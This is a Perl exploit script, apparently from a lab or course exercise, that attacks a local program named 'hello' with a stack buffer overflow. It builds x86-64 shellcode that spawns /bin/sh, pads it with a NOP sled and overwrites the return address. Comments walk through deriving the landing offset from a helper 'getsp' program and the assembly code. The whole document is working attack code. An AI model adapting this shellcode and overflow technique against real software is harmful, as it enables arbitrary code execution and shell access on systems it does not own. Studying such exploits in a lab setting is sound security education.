#!/usr/bin/perl
my $shellcode = 
"\x48\xb8\x20\x2f\x62\x69\x6e"
. "\x2f\x73\x68" 
. "\x48\xc1\xe8\x08"
. "\x50"
. "\x48\x89\xe7"
. "\x48\x31\xc0"
. "\x50"
. "\x57"
. "\x48\x89\xe6"
. "\x48\x89\xc2"
. "\x48\x83\xc0\x3b"
. "\x0f\x05"
. ("\x90" x 24);

my $getsp = hex `./getsp`;
# printf "getsp = %x\n", $getsp;
# want landing spot to be well inside the NOP region of the payload within buf array
# the magic offset to achieve this can be determined by trial and error, or roughly 
# estimates like this:
#   getsp/main's ebp = value printed by getsp + 0x4  (look at getsp.s)
#   hello/main's ebp = getsp/main's ebp - (added space for argv contents =~= 0x90)
#   hello/say_hello's ebp = hello/main's ebp - 0x20 (look at hello's assembly code)
#   hello/say_hello/buf address = hello/say_hello's ebp - 0x80 (look at say_hello's assembly code)
#   landing must be >= buf address + length("Hello, ") = buf address + 0x7
#   to accommodate some variation in behavior of getsp, choose to put landing at 
#      buf address + 0x18
#   so landing = getsp value + 0x4 - 0x90 - 0x20 - 0x80 + 0x18 = getsp value - 0x114
#  
my $landing =  $getsp - 0x114;   

#printf "landing = %x\n", $landing;

my $exploit = ("\x90" x (136
                 - length($shellcode)
                 - length("Hello, ")))
 . $shellcode
 .  pack("Q", $landing) ;  # this makes a 6 byte string because two high order nibbles are 0's, but that should be ok
#exec("echo", $buffer);
exec("./hello",$exploit)
